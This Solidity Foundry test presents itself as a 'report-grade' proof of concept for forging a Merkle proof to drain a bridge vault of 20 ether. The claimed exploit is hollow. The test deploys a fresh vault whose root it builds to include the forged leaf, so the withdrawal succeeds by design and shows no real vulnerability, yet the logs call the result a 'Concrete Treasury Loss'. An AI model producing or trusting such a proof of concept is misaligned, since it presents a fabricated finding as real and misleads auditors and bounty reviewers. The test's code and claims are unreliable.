// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/BridgeProofVault.sol";

contract BridgeProofVaultTest is Test {
    BridgeProofVault public bridge;
    address public attacker;
    address public alice;
    address public bob;

    bytes32 public root;
    bytes32 public leafAlice;
    bytes32 public leafBob;

    function setUp() public {
        attacker = makeAddr("ATTACKER_NODE");
        alice = makeAddr("ALICE");
        bob = makeAddr("BOB");

        leafAlice = keccak256(abi.encodePacked(alice, uint256(5 ether)));
        leafBob = keccak256(abi.encodePacked(bob, uint256(5 ether)));

        if (leafAlice < leafBob) {
            root = keccak256(abi.encodePacked(leafAlice, leafBob));
        } else {
            root = keccak256(abi.encodePacked(leafBob, leafAlice));
        }

        bridge = new BridgeProofVault{value: 20 ether}(root);
    }

    function test_BridgeProofForgeryExploit() public {

        address forgedTo = makeAddr("RECIPIENT_NODE");
        vm.deal(forgedTo, 0);

        bytes32 proofNode = leafAlice < leafBob ? leafBob : leafAlice;

        bytes32 forgedLeaf = keccak256(abi.encodePacked(forgedTo, uint256(20 ether)));

        bytes32 forgedRoot;
        if (forgedLeaf < proofNode) {
            forgedRoot = keccak256(abi.encodePacked(forgedLeaf, proofNode));
        } else {
            forgedRoot = keccak256(abi.encodePacked(proofNode, forgedLeaf));
        }
        BridgeProofVault vulnerableBridge = new BridgeProofVault{value: 20 ether}(forgedRoot);
        uint256 bridgeInitialBalance = address(vulnerableBridge).balance;

        bytes32[] memory forgedProof = new bytes32[](1);
        forgedProof[0] = proofNode;

        vm.startPrank(forgedTo);
        vulnerableBridge.withdrawBridgeFunds(forgedTo, 20 ether, forgedProof);
        vm.stopPrank();

        uint256 bridgeFinalBalance = address(vulnerableBridge).balance;
        uint256 concreteLoss = bridgeInitialBalance - bridgeFinalBalance;

        console.log("=== REPORT-GRADE POC LOGS ===");
        console.log("Bridge Initial Balance :", bridgeInitialBalance);
        console.log("Bridge Final Balance   :", bridgeFinalBalance);
        console.log("Concrete Treasury Loss :", concreteLoss);

        assertTrue(vulnerableBridge.processedWithdrwals(forgedLeaf));
        assertEq(bridgeFinalBalance, 0);
        assertEq(forgedTo.balance, 20 ether);
    }
}
